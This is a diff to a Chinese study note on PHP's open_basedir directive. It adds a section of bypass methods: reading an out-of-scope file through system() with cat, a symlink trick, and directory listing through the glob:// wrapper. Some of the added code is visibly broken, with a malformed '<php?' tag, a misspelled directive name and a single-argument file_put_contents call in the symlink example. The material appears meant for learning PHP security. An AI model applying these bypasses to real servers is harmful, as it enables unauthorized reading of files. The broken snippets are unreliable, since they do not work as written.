@@ -1,3 +1,7 @@
+
+
+
+
 Open_basedir  指令用来限制php只能访问哪些目录,所有php中相关文件读写的函数都会经过  `open_bsaedir` 的检查(但不限制system的命令执行)
 
 设置open_basedir 的方法，在linux下，不同的目录由`:` 分割
@@ -5,6 +9,33 @@ Open_basedir  指令用来限制php只能访问哪些目录,所有php中相关�
     ini_set('open_basedir','/var/www/a/:/tmp');
 
 在window下不同目录由`;`分割
+
+###绕过方法###
+1.通过命令执行函数
+```
+<php?
+system('cat ../../1.text');
+?>```
+
+2.通过软连接绕过
+
+```
+symlink("tmplink/../../1.txt","exploit");
+echo file_put_contents("http://127.0.0.1/exploit");
+```
+
+3.通过glob伪协议
+```
+<?php
+        $a = "glob:///var/www/test/*.txt";
+        if ( $b = opendir($a) ) {
+                while ( ($file = readdir($b)) !== false ) {
+                        echo "filename:".$file."\n";
+                }
+                closedir($b);
+        }
+?>
+```
 
 
 先来纠正一个《代码审计》一书中的小错误（可能是已修复）, 书中说指定的限制实际上是前缀，而不是目录名，例如，如果配置open_basedir=/www/a , 那么目录`/www/a` 和 `/www/ab` 都是可以访问的。 所以如果要将访问权限限制在指定的目录内， 请用斜线结束路径名。 
